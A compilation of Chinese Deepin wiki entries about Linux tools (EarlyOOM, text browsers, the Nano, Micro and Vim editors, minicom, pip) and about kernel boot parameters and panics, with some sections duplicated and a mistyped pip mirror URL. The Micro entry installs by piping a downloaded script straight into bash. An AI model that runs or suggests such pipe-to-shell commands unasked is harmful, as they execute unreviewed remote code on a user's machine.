Distrobox 不仅仅能运行 Ubuntu 子系统，你还可以通过它来安装包括 Debian、Arch Linux、Fedora、openSUSE 等“子系统”！关于 distrobox 所支持的完整的兼容列表，可以参见官方给出的这个列表：https://github.com/89luca89/distrobox/blob/main/docs/compatibility.md#containers-distros 事实上，deepin v23 所提供的 deepin v20 兼容方案（DCM）正是基于 Distrobox 的。

标题：EarlyOOM
许多用户讨厌 Linux 系统在内存耗尽情况下杀进程（oom-killer）的逻辑。大概也是因为这个原因，Linux 只在绝无其他选择时才调用它。系统会把桌面环境swap进虚拟内存、删除一整个分页缓存甚至清空每个缓冲区，最后才对进程下手。我们可没有耐心坐在一个无响应的桌面环境前等它救场。默认情况下剩余可用物理内存小于 10% 和剩余交换内存小于 10% 时，就会触发 earlyoom。

# 直接 apt 安装 apt install earlyoom # 设定为开机启动，并且马上启动 earlyoom 服务 systemctl enable --now earlyoom

-m PERCENT[,KILL_PERCENT]：至少保留物理内存总量的百分之 PERCENT（默认百分之 10）。earlyoom 在内存降至百分之 PERCENT 后向最占内存的进程发送 SIGTERM，如进一步降至百分之 KILL_PERCENT（默认为 PERCENT 的一半）就发送 SIGKILL。-s PERCENT[,KILL_PERCENT]：至少保留虚拟内存总量的百分之 PERCENT（默认百分之 10）。注意：仅当可用的物理内存和虚拟内存都少于设定量时才会触发 earlyoom。-M SIZE[,KILL_SIZE]：至少保留 SIZE KiB 物理内存。-S SIZE[,KILL_SIZE]：至少保留 SIZE KiB 虚拟内存。-n：启用 d-bus 消息。-N /PATH/TO/SCRIPT：当有进程因 OOM 被杀后调用脚本。-g：终止同一进程组中的所有进程。-d：启用调试信息。-v：打印版本信息后退出。-r INTERVAL：每 INTERVAL 秒打印一次内存报告（默认为 1），设为 0 即禁用。-p：将 earlyoom 的 niceness 设为 -20、oom_score_adj 设为 -100。--prefer REGEX：尽量优先终止名字与正则表达式 REGEX 相匹配的进程。--avoid REGEX：尽量避免终止名字与正则表达式 REGEX 相匹配的进程。--ignore REGEX：忽略名字与正则表达式 REGEX 相匹配的进程。--dryrun：试运行（不杀任何进程）。-h, --help：显示帮助。

项目地址: https://github.com/rfjakob/earlyoom 参考博客: [CSDN 链接](https://blog.csdn.net/ONE_SIX_MIX/article/details/124046026)

标题：Links
links是一个支持图形和文本模式的网页浏览器。安装Links仅支持文本模式版本的命令为：sudo apt-get install links。卸载该版本的命令为：sudo apt-get remove links。安装支持图形和文本模式的Links版本的命令为：sudo apt-get install links2。卸载该版本的命令为：sudo apt-get remove links2。Links的仓库地址是http://packages.deepin.com/deepin/pool/main/l/links2/。官方网站是http://links.twibright.com。

标题：Lynx
Lynx是一个纯文本网页浏览器。安装命令为：sudo apt-get install lynx。卸载命令为：sudo apt-get remove lynx。仓库地址是http://packages.deepin.com/deepin/pool/main/l/lynx/。相关链接中，官方网站为https://lynx.browser.org/，还有维基百科链接。

标题：Micro-Editor
Micro-Editor是一个基于终端的文本编辑器，旨在易于使用和直观，同时还利用了现代终端的功能。它是一个单一的、包含电池的、静态的二进制文件，没有依赖关系；您可以立即下载并使用它！顾名思义，micro 旨在通过易于安装和使用来成为 nano/vim 编辑器的继承者。对于喜欢在终端中工作的人或经常通过 SSH 编辑文件的人来说，它努力成为一名全职编辑器。

安装命令：`curl https://getmic.ro | bash`

卸载命令：`rm micro`

从源头构建需Go 1.16+且启用Go模块，步骤：`git clone https://github.com/zyedidia/micro`、`cd micro`、`make build`、`sudo mv micro /usr/local/bin`（可选）。

Micro支持超过75种语言，并有7种默认配色方案可供选择；支持16、256和真彩色主题。Micro易于使用，高度可定制（使用JSON配置键绑定，Lua编写插件）。支持Sublime风格多光标、插件系统（Lua编写）、鼠标操作（单击拖动选择、双击选词、三击选行），并能在编辑器中运行交互式shell。

相关链接：[官方主页](https://micro-editor.github.io/)、[源码地址](https://github.com/zyedidia/micro/)

标题：minicom
minicom 是一个串口通信工具，就像 Windows 下的超级终端。可用来与串口设备通信，如调试交换机和 Modem 等

打开深度终端输入 `sudo apt install minicom && sudo minicom`

安装好配置`sudo minicom -s`进去把端口设置下波特率等

第一次运行minicom，启动minicom要以root权限登录系统，需要进行minicom的设置，输入下了命令#minicom –s，显示的屏幕如下所示,按上下光标键进行上下移动选择，我们要对串行端口进行设置，因此选中Serial port setup,然后回车：[configuration]配置│ Filenames and paths │ 文件名和路径│ File transfer protocols│ 文件传输协议│ Serial port setup │ 串行端口设置│ Modem and dialing │ 调制解调器和拨号│ Screen and keyboard │ 屏幕和键盘│ Save setup as dfl │ 设置保存到│ Save setup as.. │ 储存设定为│ Exit │ 退出│ Exit from Minicom │ 退出minicom

选中设置串行端口，点击回车后，弹出设置的界面如下：点击‖A‖设置串行设置为/dev/ttyS0,这表示使用串口1（com1）,如果是/dev/ttyS1则表示使用串口2(com 2).按‖E‖键进入设置‖bps/par/Bits‖（波特率）界面，如下图所示。再按‖I‖以设置波特率为115200，点‖F‖键硬件流控制设置为NO，回车最终的设置结果如下，然后回车返回到串口设置主菜单中│A-Serial Device（串口设备）/dev/ttyS0 │B-Lockfile Location（锁文件位置）: /var/lock │C-Callin Program（调入程序）│D-Callout Program（调出程序）│E-Bps/Par/Bits（）: 115200 8N1 │F-Hardware Flow Control（硬件数据流控制） No │G-Software Flow Control（软件数据流控制） No Change which setting? （改变这些设置）然后选中‖Save setup as dfl‖，按回车键保存刚才的设置。如下图所示：在选中‖EXit‖退出设置模式，刚才的设置保存到‖/etc/minirc.dfl‖，接着进入初始化模式。

或可以这样设置，打开终端输入minicom后，初始化进入minicom的欢迎界面，这里提示按‖Ctrl+A‖,再按‖Z‖键进入主配置目录 按下‖O‖键,并选择串口配置选项进行配置。接下来的配置是一样的。解析一下minicom命令摘要，命令将被执行当你按下Ctrl+D ,Key是对应的―字母‖键。“D”键：拨号目录“S”键：发送文件，上传文件有几种方式：zmodem,ymodem、xmodem、kermit、ascii “P”键：通信参数。对波特率进行设置。“L”键：捕捉开关。“F”键：发送中断。“T”键:终端设置。A-终端仿真：VT102终端B-Backspace键发送：DEL键C-状态一致：启动D-换行延迟（毫秒）:0 “W”键：换行开关“G”键：运行脚本“R”键：接收文件“A”键:添加一个换行符“H”键：挂断“M”键：初始化调制解调器“K”键：运行kermit进行刷屏“E”键：切换本地回显开关“C”键:清除屏幕“O”键：配置minicom “J”键:暂停minicom “X”键：退出和复位“Q”键:退出没有复位“I”键：光标模式“Z”键：帮助屏幕“B”键：滚动返回

Minicom Advanced Systems 是一家 Intel 创投公司（Intel CapitalPortfolio），是针对带外服务器管理领域的数字和模拟KVM解决方案领商。另外，Minicom 同时也是针对数字告示领域的音视频和串口信号分配系统主导厂商。Minicom 公司成立于1987年，总部位于以色列耶路撒冷，拥有一座3600平米的办公大楼，包括研发、市场、销售和物流等部门。此外Minicom 在欧洲和美国具有区域总部，英国、意大利、法国和德国和中国具有销售支持队伍。在2005年，Minicom 收购了 Replicom公司，作为专注于IP技术的研发中心。历经20年的发展以及遍及全球50多个国家的业务，Minicom 的产品已经销售到上千个数据中心，无论小公司还是大型跨国企业。 Linux下的Minicom的功能与下的超级终端功能相似，适于在通过超级终端对设备的管理以及对嵌入操作系统的升级。

安装好配置 sudo minicom -s 进去把端口设置下波特率等

标题：Nano-Editor
多年来，Pine 一直是 Unix 系统上用于阅读电子邮件的程序。Pico 文本编辑器是程序的一部分，用于编写他或她的邮件消息。由于 Pico 和 Pine 组织良好、易于使用的界面，许多 Unix 初学者蜂拥而至。随着 90 年代中后期 GNU/Linux 的普及，许多大学生对 Pine 和 Pico 的优势（和劣势）非常熟悉。Debian GNU/Linux发行版以其在分发真正“自由”软件（即没有重新分发限制的软件）方面的严格标准而闻名，它不会包含 Pine 或 Pico 的二进制包。1999 年末，Chris Allegretta 制作了一个 Pico 克隆，当时称为 TIP（Tip Is't Pico）。2000 年 1 月 10 日，由于与另一个名为“tip”的程序的命名空间冲突，TIP 正式更名为 nano。2001 年 2 月，nano 被 Richard Stallman 宣布为官方 GNU 程序。nano 也在 2001 年 3 月 22 日发布了它的第一个产品版本。

实际上在Debian/Deepin核心系统中已经包含了该编辑器，如果没有，你可以用下列命令安装：sudo apt install nano。也可以从官方网站下载deb包进行安装：dpkg -i nano_x.y-1*.deb。目前nano的最新版本是6.3，而Deepin中的版本是3.2-3。

Deepin仓库地址：https://packages.deepin.com/deepin/pool/main/n/nano/

如果你是下载了源码，则需要通过编译的方式安装：tar -xvf nano-x.y.tar.gz。解压后，步骤为：cd nano-x.y/、./configure、make、make install（需要root权限）。

卸载nano的命令是：sudo apt remove nano。

Nano编辑器便于使用，可以在任何终端中使用，大部分的unix、linux发行版都将其作为默认安装的核心组件之一。高度可定制，可通过编辑~/.nanorc文件设置配色方案或快捷键绑定。设置nano为默认编辑器：在bash中需在.bashrc加入export EDITOR=/usr/local/bin/nano；在zsh中需在.zshrc加入该命令；在tcsh中需在.cshrc加入setenv EDITOR /usr/local/bin/nano。

nano的相关链接：官方主页https://www.nano-editor.org/；源码地址https://mirrors.sjtug.sjtu.edu.cn/gnu/nano/。

GNU nano 是一款终端下使用的经典工具，旨在免费替代 Pico 文本编辑器。多年来，Pine 一直是 Unix 系统上用于阅读电子邮件的程序。Pico 文本编辑器是程序的一部分，用于编写他或她的邮件消息。由于 Pico 和 Pine 组织良好、易于使用的界面，许多 Unix 初学者蜂拥而至。

1999 年末，Chris Allegretta 制作了一个 Pico 克隆，当时称为 TIP。随着时间推移它逐渐改进，2001 年 2 月被 Richard Stallman 宣布为官方 GNU 程序，并于 2001 年 3 月 22 日发布首个产品版本。2000 年 1 月 10 日因命名冲突正式更名为 nano。

在Debian/Deepin核心系统中通常已预装nano。如需安装可使用命令：`sudo apt install nano`。也可从官网下载deb包安装：`dpkg -i nano_x.y-1*.deb`。当前最新版本是6.3，Deepin中的版本是3.2-3。

从源码编译安装步骤：解压源码包`tar -xvf nano-x.y.tar.gz`，进入目录`cd nano-x.y/`，执行`./configure`，`make`，最后用root权限`make install`。卸载命令为：`sudo apt remove nano`。

Nano编辑器可在任何终端使用，被多数Unix/Linux发行版设为默认组件。高度可定制：通过编辑~/.nanorc文件设置配色或快捷键绑定。设为默认编辑器需在.bashrc添加`export EDITOR=/usr/local/bin/nano`或在.tcshrc添加`setenv EDITOR /usr/local/bin/nano`。

标题：neofetch
Neofetch 是一款用 bash 编写的命令行系统信息工具。 Neofetch 能美观地显示您的操作系统和软硬件的有关信息。总的来说，Neofetch 是用来在截图展示你的系统信息的。Neofetch 把别人想知道的信息显示了出来。更详细的系统统计信息或系统诊断报告还得用其他工具生成。

在终端中执行：sudo apt install neofetch 或者从 官方仓库 下载源代码 zip/tar 包，解压后在目录里运行 make install 安装

为单个用户修改配置，编辑 $HOME/.config/neofetch/config.conf 文件 为系统全局修改配置，编辑 /etc/neofetch/config.conf 文件

GitHub： https://github.com/dylanaraps/neofetch 仓库地址： http://packages.deepin.com/deepin/pool/main/n/neofetch/

标题：Pip
pip是python包管理工具，提供python包搜索、下载、安装、卸载、更新等操作。如果你在python官网下载了windows的python安装包，安装时会默认勾选安装pip。在近几年更新的linux发行版中，python3已默认集成，如果没有自带pip，可以通过以下方式安装：apt install -y python3-pip。验证是否已安装：pip3 --version。

pip常用命令（以pandas为例）：查看帮助：pip3 --help；搜索pandas包：pip3 search pandas；安装pandas包（默认最新版）：pip3 install pandas；安装或更新pandas包：pip3 install -U pandas；查看pandas包的信息：pip3 show pandas；列出已安装的python包：pip3 list；卸载pandas：pip3 uninstall pandas。

pip默认通过官方源下载安装包，官方服务器在境外，中国大陆用户访问速度慢，建议配置国内镜像源。临时使用：pip3 install pandas -i https://mirrors.aliyun.com/pypip/simple。永久使用：1. 新建目录：mkdir -p ~/.pip；2. 新建配置文件并编辑：vim ~/.pip/pip.conf，内容为[global] index-url = https://mirrors.aliyun.com/pypi/simple/ [install] trusted-host=mirrors.aliyun.com。

常见问题：执行pip install -U pip时权限错误导致pip被卸载，无法安装其他库。解决方法：使用python -m ensurepip恢复pip。

标题：Vim文件编辑器
vim 是 vi 的一个升级版本，gvim 算是 vim 的一个 GUI 版本，或者说是 vim 的一个升级版本。vim 兼容 vi 的所有指令，并且有更多的优势，同时，vim 还拥有众多的插件，与 emacs 一样，虽然本身只是一个编辑器，但是通过插件的拓展可以实现许多高级的应用，如不同语言的语法高亮、语法补全甚至是游戏等，当然，在这方面 vim 或许还不能如 emacs，毕竟 emacs 号称是一个操作系统。

进入 vim 后（正常模式），按下 i 键进行打几个字。然后按下 Esc 键退出编辑（插入）模式，回到正常模式。在正常模式下，h 键为光标左移，l 键为光标右移，j 键为光标下移一行，k 键为光标上移一行。再次按下 i 键，进入编辑模式。更多应用及命令请自行研究。在正常模式下，输入 " :help" 打开帮助文档。

在 /home/user/ 下新建一个 .vimrc 文件并进入编辑，这里是一个简单的配置：```" 剪贴板 set clipboard=unnamed " 显示行号 set number " 开启语法高亮 syntax on " 显示标尺 set ruler " 打开折叠 set foldenable " 打开自动缩进 set autoindent " C 语言缩进 set cindent " 缩进为 4 个空格 set shiftwidth=4 " tab 键相当于 4 个空格 set tabstop=4```

除了通过 Vundle 安装语法补全 YouCompleteMe，也可以自己手动编译安装，这里有另外一种更加简单的方法。```# 试试这个命令，看是否已经安装 vim-addons $ vim-addons # 如果没有安装 vim-addons，则需安装 vim-addon-manager $ sudo apt-get install vim-addon-manager # 开始安装 YouCompleteMe $ sudo apt-get install vim-youcompleteme # 将 YCM 加入 addons 管理器中 $ vim-addons install youcompleteme```结束，新建一个 main.c 并进行编辑试试。需要说明的是，安装了 YCM 后 vim 的开启速度会慢那么 1s。

安装gvim```sudo apt-get install vim-gtk3```

将gvim添加到启动器创建 `/usr/share/applications/gvim.desktop`文件并加入以下内容：```[Desktop Entry] Name=Gvim Exec=gvim Icon=vim-gtk Terminal=false X-MultipleArgs=false Type=Application Encoding=UTF-8 Categories=Application;Utility;Dictionary; StartupNotify=false```创建desktop文件参考wiki：[https://wiki.deepin.org/wiki/Desktop_Entry_文件](https://wiki.deepin.org/wiki/Desktop_Entry_文件)

安装vim中文帮助文档从这里下载压缩包 vimcdoc-2.1.0.tar.gz [https://sourceforge.net/projects/vimcdoc/](https://sourceforge.net/projects/vimcdoc/)解压后```mkdir ~/.vim cd vimcdoc-2.1.0 ./vimcdoc.sh -i```这样就安装好了，再进入vim后，`:help`出来应该就是中文的了。

标题：w3m
w3m是一个文本模式的网页浏览器，支持显示网页表格、框架元素，并具有分页功能。安装w3m的命令是 sudo apt-get install w3m，卸载命令是 sudo apt-get remove w3m。安装图像支持插件使用 sudo apt-get install w3m-img，卸载该插件使用 sudo apt-get remove w3m-img。仓库地址为 http://packages.deepin.com/deepin/pool/main/w/w3m/。官方网站为 http://w3m.sourceforge.net。

标题：linux内核启动参数
linux 启动问题，安装问题，驱动问题，是很多linux用户特别烦恼的。但事实上，有补救的方法，那就是通过修改内核启动参数，兼容不同硬件环境下，以求进入系统进行下一步操作。

这是一个新型的显示模式，即内核在启动阶段调用更先进的图形显示技术，以达到更好的显示效果。副作用就是兼容性低。1. 可以设置`nomodeset` 或者`modeset=0`关闭这项功能，至少保证进入字符界面。2. 更进阶一点的写法是：`i915.modeset=0`,其中i915是intel的显示驱动，该命令可以单独关闭该驱动的KMS。

很多视频驱动都是以动态模块的方式链接到内核的，内核在启动过程中会加载这些驱动。1. `modprobe.blacklist=nouveau` 就禁止加载该模块，这可以屏蔽有问题的驱动程序。

1. `nvidia` ： /lib/modules/4.15.0-30deepin-generic/kernel/drivers/video/nvidia.ko ，nvidia官方驱动，性能棒棒的，不过默认没有安装，要自己装，对一般用户是一个挑战 2. `nvidiafb` ： /lib/modules/4.15.0-30deepin-generic/kernel/drivers/video/fbdev/nvidia/nvidiafb.ko ，一个老式的驱动，估计性能很差，兼容性如何还不清楚，因为我没用过。 3. `nvidia_drm` ： /lib/modules/4.15.0-30deepin-generic/kernel/drivers/video/nvidia-drm.ko ，DRM是“直接渲染管理器”的缩写，是一个替代“fb帧缓冲区”的现代版本，包括“GEM图形执行管理器”和“KMS内核模式设置”技术。其作用就是更好的协作多应用和多GPU。其中多GPU技术类似"Nvidia Optimus"，称为"prime"。好吧，说到底就是nvidia驱动组成的一部分。 4. `nouveau` ： 可以理解为nvidia的第三方开源驱动，因为是第三方，所以兼容性差，性能低。因为是开源，和linux的适配度高，喜忧参半的一款驱动，也是nvidia显卡在linux的默认驱动。 5. `i915` ： intel的官方驱动。 6. `radeon` : 旧的amd显卡设备的开源驱动 7. `amdgpu` : 新的amd显卡设备的开源驱动 8. `amdgpu-pro` ： 官方闭源驱动

initramfs 是linux的一个纯净的启动映像环境，简而言之就是制作一个内存中的启动硬盘。

linux系统大多数通过grub来引导，即开机出现的引导菜单。出现菜单读秒时，按e进入编辑状态，按F10执行编辑后的菜单。找到`linux`开始的一行，该行格式一般如下：linux /.../vmlinuz... root=UUID=xxx ... 翻译过来就是：“引导linux 内核文件 启动分区 内核参数” 我们要修改的就是内核参数部分。

参数格式：1. 模块名.参数=值 2. `modprobe` 动态模块名 参数=值 3. 参数 获取参数的方法：1. `/sys/module/模块名/parameters` 2. `/proc/cmdline` 启动参数 3. `modinfo -p 模块名`

常用模块：- `ACPI` 高级电源配置接口 - `APIC` 高级可编程中断控制器 - `DRM` 直接渲染管理器 - `FB` 帧缓冲 - `IOMMU` 设备内存相关 - `KVM` 虚拟机 - `LOOP` 回环设备 - 显卡驱动：`i915`、`nvidia`、`nouveau`等

常用参数：- `quiet` 安静模式 - `debug` 详细信息 - `memtest=1` 测试一次内存 - `erst_disable` 解决ERST故障 - `hest_disable` 解决HEST故障 - `nosoftlockup` 禁止软死锁检测 - `nowatchdog` 禁止硬死锁检测 - `noapic` 禁止IO-APIC输入输出高级可编程中断控制器 - `nolapic` 禁止cpu-apci - `acpi=off` 禁止acpi高级电源配置接口

常用参数：- `acpi=strict` 严格的acpi - `acpi_backlight=vendor` 使用厂家的屏幕亮度调节器 - `acpi_os_name="Linux"` 告知acpi系统名称，欺骗有问题的BIOS。 - `"Windows 2001"` xp - `"Windows 2006"` vista - `"Windows 2009"` win7 - `"Windows 2012"` win8 - `"Windows 2013"` win8.1 - `acpi_osi="Linux"` 添加字符串 - `acpi_osi=!` 删除所有字符串 - `pnpacpi=off` 关闭acpi的即插即用功能

常用参数：- `resume=/dev/swap` 休眠启动的分区 - `resume_offset=xxx` 休眠文件的偏移量 - `resumedelay=6` 等待5秒启动休眠设备 - `resumewait` 等待直到休眠设备准备好 - `kvm-amd.nested=0` 关闭amd cpu的嵌套虚拟化 - `root=xxx` 启动设备或文件 - `rootfstype=xxx` 启动设备的文件系统类型 - `rotflags=xxx` 挂载选项 - `ro` 只读 - `rw` 读写 - `init=路径` 启动程序 - `rdinit=路径` 内存盘中的启动程序 - `nomodule` 禁用内核模块加载 - `3` 启动命令行和非图形界面 - `splash` 启动画面

modeset（KMS：kernel mode set) 是一个新型的显示模式，即内核在启动阶段调用更先进的图形显示技术，以达到更好的显示效果。副作用就是兼容性低。可以设置nomodeset或者modeset=0关闭这项功能，至少保证进入字符界面。更进阶一点的写法是：i915.modeset=0，其中i915是intel的显示驱动，该命令可以单独关闭该驱动的KMS。

很多视频驱动都是以动态模块的方式链接到内核的，内核在启动过程中会加载这些驱动。modprobe.blacklist=nouveau就禁止加载该模块，这可以屏蔽有问题的驱动程序。显卡驱动包括：nvidia（官方驱动，性能好，但需要手动安装）、nvidiafb（老式驱动）、nvidia_drm（DRM是直接渲染管理器的缩写）、nouveau（nvidia显卡在linux的默认驱动）、i915（intel的官方驱动）、radeon（旧的amd显卡开源驱动）、amdgpu（新的amd显卡开源驱动）、amdgpu-pro（官方闭源驱动）。

linux系统大多数通过grub来引导。出现菜单读秒时，按e进入编辑状态，按F10执行编辑后的菜单。找到linux开始的一行，该行格式一般如下：linux /.../vmlinuz... root=UUID=xxx ...。我们要修改的就是内核参数部分。参数格式：1.模块名.参数=值 2.modprobe动态模块名参数=值 3.参数。获取参数的方法：1./sys/module/模块名/parameters 2./proc/cmdline启动参数 3.modinfo -p模块名。

常用参数包括：quiet（安静模式）、debug（详细信息）、memtest=1（测试一次内存）、acpi=off（禁止acpi高级电源配置接口）、acpi_os_name="Linux"（告知acpi系统名称）、root=xxx（启动设备或文件）、ro（只读）、rw（读写）、3（启动命令行和非图形界面）。

标题：linux内核配置项介绍
Linux 内核是 Linux 操作系统的主要组件，也是计算机硬件与其进程之间的核心接口。它负责两者之间的通信，还要尽可能高效地管理资源。之所以称为内核，是因为它在操作系统中就像果实硬壳中的种子一样，并且控制着硬件的所有主要功能。内核的用途主要有以下 4 项工作：**内存管理**：追踪记录有多少内存存储了什么以及存储在哪里;**进程管理**：确定哪些进程可以使用中央处理器、何时使用以及持续多长时间;**设备驱动程序**：充当硬件与进程之间的调解程序/解释程序;**系统调用和安全防护**：从流程接受服务请求.

内核配置信息是关于Linux操作系统内核的配置选项集合，其中配置了Linux操作系统可用的硬件、功能和特性。这些配置选项通过内核内置的.config文件进行配置，该文件通常存储在Linux系统的/boot目录或者内核源代码目录中。

常见的内核配置信息.config文件中经常出现的配置信息如下：CONFIG_HZ：这个配置指定了内核每秒进行的时钟滴答数。默认值是100，这意味着内核将每秒执行100次调度。CONFIG_MODULES: 这个配置指定了内核是否支持模块化，即是否支持动态加载和卸载模块的功能。CONFIG_BLK_DEV_SD: 这个配置指定了内核是否支持块设备SD卡。CONFIG_IP_MULTICAST：这个配置指定了内核是否支持IP多播功能。CONFIG_NETFILTER：这个配置指定了内核是否支持网络包过滤和防火墙功能。CONFIG_CRYPTO：这个配置指定了内核是否支持加密算法。CONFIG_USB_ARCH_HAS_HCD：这个配置指定了内核是否支持USB主控制器硬件驱动程序。CONFIG_SLAB: 这个配置指定了内核如何进行内存分配管理。配置正确的内核能够让系统更加的高效和顺畅。我们可以访问[https://www.kernelconfig.io/index.html](https://www.kernelconfig.io/index.html)来检索相应配置项的作用。

在Linux中，可以使用以下命令来查看内核的配置信息：方式一：```plaintextzcat /proc/config.gz```该命令会显示当前正在运行的内核的配置信息，其中包含了许多内核选项的设置。可以配合grep命令对查询项进行过滤查找方式二：```plaintextless /boot/config-$(uname -r)```该命令将使用less命令打开当前正在运行的内核的配置文件，并允许您逐页浏览其中的内容。当然，也可以改用cat

标题：Linux内核错误
内核错误(Kernel panic)是指操作系统在监测到内部的致命错误，并无法安全处理此错误时采取的动作。这个概念主要被限定在Unix以及类Unix系统中；对于Microsoft Windows系统，等同的概念通常被称为蓝屏死机。操作系统内核中处理Kernel panic的子程序（在AT&T派生类以及BSD类Unix中，通常称为panic()）通常被设计用来向控制台输出错误信息，向磁盘保存一份内核内存的转储，以便事后的调试，然后等待系统被手动重新引导，或自动重新引导。该程序提供的技术性信息通常是用来帮助系统管理员或者软件开发者诊断问题的。操作系统试图读写无效或不允许的内存地址是导致内核错误的一个常见原因。内核错误也有可能在遇到硬件错误或操作系统BUG时发生。在许多情况中，操作系统可以在内存访问违例发生时继续运行。然而，系统处于不稳定状态时，操作系统通常会停止工作以避免造成破坏安全和数据损坏的风险，并提供错误的诊断信息。

kernel panic错误表现 kernel panic 主要有以下几个出错提示：Kernel panic-not syncing fatal exception in interrupt；kernel panic - not syncing: Attempted to kill the idle task!；kernel panic - not syncing: killing interrupt handler!；Kernel Panic - not syncing：Attempted to kill init !

查看了一下 linux的源码文件，找到相关位置：kernel/panic.c；NORET_TYPE void panic(const char * fmt, ...) { static char buf[1024]; va_list args; bust_spinlocks(1); va_start(args, fmt); vsnprintf(buf, sizeof(buf), fmt, args); va_end(args); printk(KERN_EMERG "Kernel panic - not syncing: %s/n",buf); bust_spinlocks(0); kernel/exit.c；if (unlikely(in_interrupt())) panic("Aiee, killing interrupt handler!"); #中断处理；if (unlikely(!tsk->pid)) panic("Attempted to kill the idle task!"); #空任务；if (unlikely(tsk->pid == 1)) panic("Attempted to kill init!"); #初始化

从其他源文件和相关文档看到应该有几种原因：1.硬件问题：使用了 SCSI-device 并且使用了未知命令。#WDIOS_TEMPPANIC Kernel panic on temperature trip # The SETOPTIONS call can be used to enable and disable the card # and to ask the driver to call panic if the system overheats. # If one uses a SCSI-device of unsupported type/commands, one # immediately runs into a kernel-panic caused by Command Error. To better # understand which SCSI-command caused the problem, I extended this # specific panic-message slightly. # read/write causes a command error from # the subsystem and this causes kernel-panic

2.系统过热：如果系统过热会调用panci，系统挂起。#WDIOS_TEMPPANIC Kernel panic on temperature trip # The SETOPTIONS call can be used to enable and disable the card # and to ask the driver to call panic if the system overheats.

3.文件系统引起：#A variety of panics and hangs with /tmp on a reiserfs filesystem #Any other panic, hang, or strange behavior # It turns out that there's a limit of six environment variables on the # kernel command line. When that limit is reached or exceeded, argument # processing stops, which means that the 'root=' argument that UML # usually adds is not seen. So, the filesystem has no idea what the # root device is, so it panics. # The fix is to put less stuff on the command line. Glomming all your # setup variables into one is probably the best way to go. Linux内核命令行有6个环境变量。如果即将达到或者已经超过了的话 root= 参数会没有传进去 启动时会引发panics错误。vi grub.conf ##################### title Red Hat Enterprise Linux AS (2.6.9-67.0.15.ELsmp) root (hd0,0) kernel /boot/vmlinuz-2.6.9-67.0.15.ELsmp ro root=LABEL=/ initrd /boot/initrd-2.6.9-67.0.15.ELsmp.img title Red Hat Enterprise Linux AS-up (2.6.9-67.EL) root (hd0,0) kernel /boot/vmlinuz-2.6.9-67.EL ro root=LABEL=/ initrd /boot/initrd-2.6.9-67.EL.img 应该是 其中的 root=LABEL=/ 没有起作用。

4.内核更新：网上相关文档多半是因为升级内核引起的，建议使用官方标准版、稳定版 另外还有使用磁盘的lvm 逻辑卷，添加CPU和内存。可在BIOS中禁掉声卡驱动等不必要的设备。也有报是ext3文件系统的问题。 解决： 手工编译内核，把 ext3相关的模块都编译进去。

5.处理panic后的系统自动重启：panic.c源文件有个方法，当panic挂起后，指定超时时间，可以重新启动机器。if (panic_timeout > 0) { int i; /* * Delay timeout seconds before rebooting the machine. * We can't use the "normal" timers since we just panicked.. */ printk(KERN_EMERG "Rebooting in %d seconds..",panic_timeout); for (i = 0; i < panic_timeout; i++) { touch_nmi_watchdog(); mdelay(1000); } 修改方法： /etc/sysctl.conf文件中加入 kernel.panic = 30 #panic错误中自动重启，等待时间为30秒 kernel.sysrq=1 #激活Magic SysRq！ 否则，键盘鼠标没有响应

内核错误之后的解决办法：Linux的稳定性勿容置疑，但是有些时候一些Kernel的致命错误还是会发生（有些时候甚至是因为硬件的原因或驱动故障），Kernel Panic会导致系统crash，并且默认的系统会一直hung在那里，直到你去把它重新启动！ 不过你可以在/etc/sysctl.conf文件中加入 kernel.panic = 20 来告诉系统从Panic错误中自动重启，等待时间为20秒！这个由管理员自己设定！ 另外一个讨厌的事情是系统hung住之后，键盘鼠标没有响应，这个可以通过设置Magic SysRq来试着解决，也是在/etc/sysctl.conf中 kernel.sysrq=1 来激活Magic SysRq！ 这样在挂住的时候至少还有一招可以使， 按住 [ALT]+[SysRq]+[COMMAND], 这里SysRq是Print SCR键，而COMMAND按以下来解释！ b - 立即重启 e - 发送SIGTERM给init之外的系统进程 o - 关机 s - sync同步所有的文件系统 u - 试图重新挂载文件系统

Kernel panic问题如何调试 Linux kernel panic是很难定位和排查的重大故障,一旦系统发生了kernel panic，相关的日志信息非常少，而一种常见的排查方法—重现法–又很难实现，因此遇到kernel panic的问题，一般比较头疼。没有一个万能和完美的方法来解决所有的kernel panic问题，这篇文章仅仅只是给出一些思路，一来如何解决kernel panic的问题，二来可以尽可能减少发生kernel panic的机会。

案例分析：Kernel Panic -- not syncing: attempted to kill idle task。出现这种错误是进入不了操作系统的，kernel panic的成因有多种多样，但这种情况是比较奇特的一种，因为它很可能不是软件的问题，而是硬件的问题。几年前我用带奔三的旧主板时遇到过，当时不知道如何解决，只知道它偶尔出现，放一放也会自行消失，所以当初没有重视。现在，当我重新用上旧主板，这种情况又出现了，而且这一次比较顽固，无论怎样重启，总是这条错误，不但硬盘上现有的两个操作系统都进不去，而且连光驱里的LiveCD也进不去了，这显然不是硬盘的问题，也不是内核的问题。以前我就明白应该是主板的问题，可能是主板太旧，电路信号不太通畅的原因，但不知道怎么办，害得我一天一宿没上网。今天早上去网吧，查了点资料，大体上有几种说法：一种是在grub作内核引导时添加idle参数，这一种是国内网常见的一种说法；第二个方法是注意一下bios中显示的CPU或者内存条的温度；第三种是重新作initrd，即mkinitrd；第四种是在grub中启动memtest86来测试内存，这几个是外国人的论坛上说的。我回到家以后，先试了第一种，加了idle的各种参数后，毫无效果，关于第二种方法，我在bios中看到似乎硬件的温度不是可以调节的，但我从这个思路出发，考虑到，如果与内存有关，不妨把三个内存条互换一下位置，也许有效，于是，我把我的三个SD内存换了位置，然后开机，一切正常了。

Kernel Panic -- not syncing: attempted to kill init。这一种情况的表现是系统的极不稳定。或者进入不了系统，syslog停止于kernel panic；或者重启后可以进入系统，但不久就死机，键盘上的Caps-Lock与Scroll-Lock两个灯在闪。这种错误与上面那个有相同的成因，解决方法也相同。

标题：Linux系统内核概述
Linux 内核是一种开源的类 Unix 操作系统宏内核。Linux 内核是 Linux 操作系统的主要组件，也是计算机硬件与其进程之间的核心接口。它负责两者之间的通信，还要尽可能高效地管理资源。内核的用途主要有以下4项工作：内存管理（追踪记录有多少内存存储了什么以及存储在哪里）、进程管理（确定哪些进程可以使用中央处理器、何时使用以及持续多长时间）、设备驱动程序（充当硬件与进程之间的调解程序/解释程序）、系统调用和安全防护（从流程接受服务请求）。

